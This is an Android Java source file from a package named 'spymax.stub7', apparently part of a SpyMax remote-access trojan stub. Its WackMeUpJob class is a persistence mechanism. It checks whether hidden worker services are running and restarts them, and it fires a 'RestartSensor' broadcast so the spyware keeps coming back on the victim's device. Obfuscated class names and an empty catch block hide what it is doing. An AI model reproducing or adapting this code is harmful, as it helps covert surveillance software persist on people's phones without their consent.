package spymax.stub7;

import android.annotation.TargetApi;
import android.app.ActivityManager;
import android.app.job.JobParameters;
import android.app.job.JobService;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

import java.util.List;


@TargetApi(Build.VERSION_CODES.LOLLIPOP)

public class WackMeUpJob extends JobService {


    private int JobId=100;
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        sendBroadcast(new Intent(getApplicationContext(), SensorRestarterBroadcastReceiver.class).setAction("RestartSensor"));

        return START_STICKY;
    }

    @Override
    public boolean onStartJob(JobParameters params) {

        try
        {

            if(!isServiceWork(this,_srv_worker_.class.getName())){

                startService(new Intent(this,_srv_worker_.class));
            }
            if(!isServiceWork(this,ClassGen11.class.getName())){

                startService(new Intent(this,ClassGen11.class));
            }
        }catch (Exception b){

        }

      //  sendBroadcast(new Intent(getApplicationContext(), SensorRestarterBroadcastReceiver.class).setAction("RestartSensor"));


        return false;
    }

    @Override
    public boolean onStopJob(JobParameters params) {
        return false;
    }


    private boolean isServiceWork(Context context,String serviceName){
        ActivityManager am= (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        List<ActivityManager.RunningServiceInfo> runningServices = am.getRunningServices(100);
        if(runningServices == null){
            return false;
        }
        for (ActivityManager.RunningServiceInfo service : runningServices) {
            String className = service.service.getClassName();
            if(className.equals(serviceName)){
                return true;
            }
        }
        return false;

    }
}
